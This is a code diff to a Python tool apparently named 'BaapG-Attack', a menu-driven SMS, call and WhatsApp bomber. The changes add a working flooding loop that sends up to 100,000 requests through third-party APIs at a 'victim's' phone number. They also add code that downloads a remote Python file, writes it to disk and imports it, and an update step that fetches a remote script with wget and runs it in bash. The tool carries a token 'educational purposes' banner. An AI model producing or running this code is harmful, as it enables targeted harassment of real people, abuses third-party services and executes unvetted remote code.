@@ -183,7 +183,7 @@ W='\033[0m'
 
 def check_intr():
     try:
-        requests.get("https://motherfuckingwebsite.com")
+        requests.get("https://motherfuckingwebsite.com",timeout=1)
     except Exception:
         print("Abe Chutiya Internet On Kar. Internet Error")
         sys.exit(2)       
@@ -221,23 +221,92 @@ logo = f"""{Style.BRIGHT+text}
 {C}             Version : {G}{version}
  """
 
+
+def prepend_line(file_name, line):
+    dummy_file = file_name + '.bak'
+    with open(file_name, 'r') as read_obj, open(dummy_file, 'w') as write_obj:
+        write_obj.write(line + '\n')
+        for line in read_obj:
+            write_obj.write(line)
+    os.remove(file_name)
+    os.rename(dummy_file, file_name)
+
+
+def getApi(target):
+    apiUrl = "https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/apiData.baap"
+    try:
+        a = requests.get(apiUrl)
+        open('dataBa.py', 'wb').write(a.content)
+        prepend_line('dataBa.py',f'target = {target}')
+        import dataBa
+        from dataBa import apis, apidata
+    except Exception as e:
+        return exit(str(e))
+    return {"apis":apis,"apidata":apidata,"total":len(apis)}
+
+                
+def bomb(times1,target):
+    finalApi = getApi(target)
+    apis = finalApi["apis"]
+    apidata = finalApi["apidata"]
+    total = finalApi["total"]
+    times = round(times1/total)
+    if times == 0:
+        times = 1
+    print (printBox("Total apis : "+str(total)+" | Number of times to send : "+str(times1),col1=Style.BRIGHT+B,col2=Y))   
+    print()
+    success =0
+    fail =0
+    for i in range(0,times):
+        for api in apis:
+            if "POST" in api:
+                url,data,head,method,check = api
+                try:
+                    a = requests.post(url,data=data,headers=head)
+                    if check in a.text:
+                        success += 1
+                    else:
+                        
+                        fail += 1
+                except Exception:
+                    pass
+                    fail += 1
+                print(G+"\r"+"Success : "+str(success)+R+" Error : "+str(fail),end="")
+            elif "GET" in api:
+                url,head,method,check = api
+                try:
+                    a = requests.get(url,headers=head)
+                    if check in a.text:
+                        success += 1
+                    else:
+                        
+                        fail += 1
+                except Exception:
+                    pass
+                    fail += 1
+                print("\r"+"Success : "+str(success)+R+" Error : "+str(fail),end="")
+            else:
+                print ("Unexpectedly Error")
+                return exit()
+            
+        continue
+    return success,fail
+
+
 def sms():
-	check_intr()
 	os.system('clear')
 	print(Style.BRIGHT+logo)
-	print(G)
-	print(f"{R} | WARNING |  {B}\n\n This tool is very dangerous don't try it on your self\n ")
 	print()
-	print ()
+	print(f"{R} | WARNING |  {y}\n\n * This tool is very dangerous don't try it on your self\n ")
+	print()
 	target = input(
 	    f"{G}[{W}+{G}] Enter the Victim's Phone number \n\n{W}-----{R}# {C}")	
 	print()
 	a = requests.get('https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.protected.numbers').text
-	if target in a:
-		print(f"\n {R} You Can't Bomb This Number")
-		exit(2)
+	if target in a :
+		error(f"{R} You Can't Bomb This Number");print();res()
 	else:
-		pass	
+		bomb(100000,target)	
 	print(f"\n{B} Press {G}Ctrl { R}+ {G} C {B} to exit\n")
 
 
@@ -313,47 +382,55 @@ def clr():
 	os.system('clear')
 
 def main(a):
-	os.system('clear')
-	ver_check() if a is False else os.system("")
-	print(logo)
-	print(Y)
-	os.system(f'dat=$(date) && echo {Y}  ✯ {W}STARTED ON : {C}$dat')
-	print(printBox(f"⚡ This tool is only for Educational Purposes !",col1=G,col2=Y))
+    os.system('clear')
+    ver_check() if a is False else os.system("")
+    print(logo)
+    print(Y)
+    os.system(f'dat=$(date) && echo {Y}  ✯ {W}STARTED ON : {C}$dat')
+    print(printBox(f"⚡ This tool is only for Educational Purposes !",col1=G,col2=Y))
 
-	print(f"\n{G}Choose Any Option\n")
-	text = (f"""{G}[{W}${G}]{R} BAAPG ATTACK ☣️ {W}>>>{G}\n[{W}1{G}]{Y} SMS ATTACK {W}>>>\n{G}[{W}2{G}]{Y} CALL ATTACK {W}>>>\n{G}[{W}3{G}]{Y} MAIL BOMBER\n{W}{G}[{W}4{G}]{Y} WHATSAPP BOMBER{W} >>>\n{G}[{W}5{G}]{Y} ABOUT {W}>>>\n{G}[{W}6{G}]{Y} EXIT {W}>>>\n{G}[{W}>{G}]{Y} UPDATE {W}>>>\n""")
-	print(text)
-	a = input(f"{R} >>> {G}")
-	if a == '$':
-		sms()
-	elif a == '1':
-		clr()
-		banner()
-		selectnode(mode='sms')
-		res()
-	elif a == '2':
-		selectnode(mode='call')
-	elif a == '3':
-		selectnode(mode='mail')
-	elif a == '4':
-		wpbomb()		
-		res()	
-	elif a == '5':
-		print(f"{C}\n All Credit : Krishna Singh Rajput \n {G}Coded by Ansh Dadwal\n\n{W}{lic}\n\n")
-		res()
-	elif a == '6':
-		exit()
-	elif a == '>':
-		print()
-		print(f'{G} Starting Update')
-		print()
-		ver_check()
-		check_intr()
-		os.system("wget https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.updatefile && bash .updatefile")
-		print(f"{G} Restart it")
-		exit()
-	else:
-		return main(True)
+    print(f"\n{G}Choose Any Option\n")
+    text = (f"""{G}[{W}${G}]{R} BAAPG ATTACK ☣️ {W}>>>{G}\n[{W}1{G}]{Y} SMS ATTACK {W}>>>\n{G}[{W}2{G}]{Y} CALL ATTACK {W}>>>\n{G}[{W}3{G}]{Y} MAIL BOMBER\n{W}{G}[{W}4{G}]{Y} WHATSAPP BOMBER{W} >>>\n{G}[{W}5{G}]{Y} ABOUT {W}>>>\n{G}[{W}6{G}]{Y} EXIT {W}>>>\n{G}[{W}>{G}]{Y} UPDATE {W}>>>\n""")
+    print(text)
+    a = input(f"{R} >>> {G}")
+    if a == '$':
+    	sms()
+    elif a == '1':
+    	clr()
+    	banner()
+    	selectnode(mode='sms')
+    	res()
+    elif a == '2':
+        clr()
+        banner()        
+        selectnode(mode='call')
+        res()
+    elif a == '3':
+        clr()
+        banner()       
+        selectnode(mode='mail')
+        res()
+    elif a == '4':
+        clr()
+        banner()        
+        wpbomb()		
+        res()	
+    elif a == '5':
+    	print(f"{C}\n All Credit : Krishna Singh Rajput \n {G}Coded by Ansh Dadwal\n\n{W}{lic}\n\n")
+    	res()
+    elif a == '6':
+    	exit()
+    elif a == '>':
+    	print()
+    	print(f'{G} Starting Update')
+    	print()
+    	ver_check()
+    	check_intr()
+    	os.system("wget https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.updatefile && bash .updatefile")
+    	print(f"{G} Restart it")
+    	exit()
+    else:
+    	return main(True)
 
 def res():
 	r=input(f"{Y}Do you want to restart [y/n] = ")
@@ -361,12 +438,25 @@ def res():
 		main()
 	else:
 		print()
-		aPrint(f"Follow on Ig : {W}@krish_na_2568",time_test=0.1)
+		aPrint(f"Follow on Ig : {W}@krish_na_2568",time_test=0.15)
 		exit()
 
 
 
 def selectnode(mode=""):
-    pass
+    if mode == "mail":
+        return message("Mail bomber will be addedd soon ");print();res()
+    target = input(
+        f"{G}[{W}+{G}] Enter the Victim's Phone number \n\n{W}-----{R}# {C}") 
+    print()
+    times = input(f"{G}[{W}+{G}] Enter the no. of {mode} to send \n\n{W}-----{R}# {C}")  
+    print()
+    a = requests.get('https://raw.githubusercontent.com/T-Dynamos/BaapG-Attack/main/.protected.numbers').text
+    if target in a :
+        error(f"{R} You Can't Bomb This Number");print();res()
+    else:
+        bomb(int(times),target) 
+        print()
+
 
 main(False)
